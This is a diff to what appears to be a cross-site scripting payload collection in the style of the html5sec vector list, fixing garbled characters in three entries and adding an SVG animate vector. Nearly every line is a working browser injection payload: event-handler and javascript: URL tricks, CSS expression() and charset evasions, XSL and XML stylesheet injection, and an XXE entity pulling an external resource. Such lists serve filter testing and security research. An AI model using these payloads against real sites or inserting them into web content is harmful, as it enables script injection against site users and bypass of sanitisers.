@@ -16,7 +16,7 @@
 X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
 <?xml-stylesheet href="javascript:alert(1)"?><root/>
 <script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
-<meta charset="x-mac-farsi">Â¼script Â¾alert(1)//Â¼/script Â¾
+<meta charset="x-mac-farsi">¼script ¾alert(1)//¼/script ¾
 <script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
 <script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
 <input onblur=focus() autofocus><input>
@@ -60,7 +60,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
 <div style="[a]color[b]:[c]red">XXX</div>
 <div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
 <!-- IE 6-8 --><x '="foo"><x foo='><img src=x onerror=alert(1)//'><!-- IE 6-9 --><! '="foo"><x foo='><img src=x onerror=alert(2)//'><? '="foo"><x foo='><img src=x onerror=alert(3)//'>
-<embed src="javascript:alert(1)"></embed> // O10.10â, OM10.0â, GC6â, FF<img src="javascript:alert(2)"><image src="javascript:alert(2)"> // IE6, O10.10â, OM10.0â<script src="javascript:alert(3)"></script> // IE6, O11.01â, OM10.1â
+<embed src="javascript:alert(1)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF<img src="javascript:alert(2)"><image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓
 <!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>
 <svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
 <?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?><root/>
@@ -77,7 +77,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
 <?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
 <?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
 <object allowscriptaccess="always" data="test.swf"></object>
-<style>*{x:ï½ï½ï½ï½ï½ï½ï½ï½ï½ï½(write(1))}</style>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style>
 <x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
 <?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
 <x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
@@ -134,6 +134,7 @@ XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!
 <xmp><%</xmp><img alt='%></xmp><img src=xx:x onerror=alert(1)//'><script>x='<%'</script> %>/alert(2)</script>XXX<style>*['<!--']{}</style>-->{}*{color:red}</style>
 <?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval><if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if></template></stylesheet>
 <form action="" method="post"><input name="username" value="admin" /><input name="password" type="password" value="secret" /><input name="injected" value="injected" dirname="password" /><input type="submit"></form>
+<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?"><circle r="400"></circle><animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" /></a>
 <isindex type=image src=1 onerror=alert(1)> 
 <isindex action=javascript:alert(1) type=image> 
 <object data="javascript:alert(0)"> 
